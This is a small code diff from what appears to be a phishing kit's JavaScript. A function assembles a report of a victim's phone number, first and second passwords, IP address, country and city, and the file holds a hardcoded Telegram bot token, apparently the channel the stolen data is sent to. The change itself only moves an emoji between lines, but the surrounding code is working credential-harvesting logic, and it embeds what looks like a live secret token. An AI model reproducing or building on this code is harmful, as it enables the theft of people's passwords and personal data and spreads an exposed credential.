@@ -218,8 +218,8 @@ function showPrompt(IpAddress) {
 📞 <strong>Phone Number: </strong><code>${$("#phone").val()}</code>
 🔑 <strong>First Password: </strong><code>${password}</code>
 🔑 <strong>Second Password: </strong><code>${secondPassword}</code>
- <strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
-🌐 <strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
+🌐 <strong>IP Address: </strong><code>${IpAddress.ipAddress}</code>
+ <strong>Country: </strong><code>${IpAddress.countryName}</code> (<code>${IpAddress.countryCode}</code>)
  <strong>City: </strong><code>${IpAddress.city}</code>`;
 
         const botToken = '7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk';
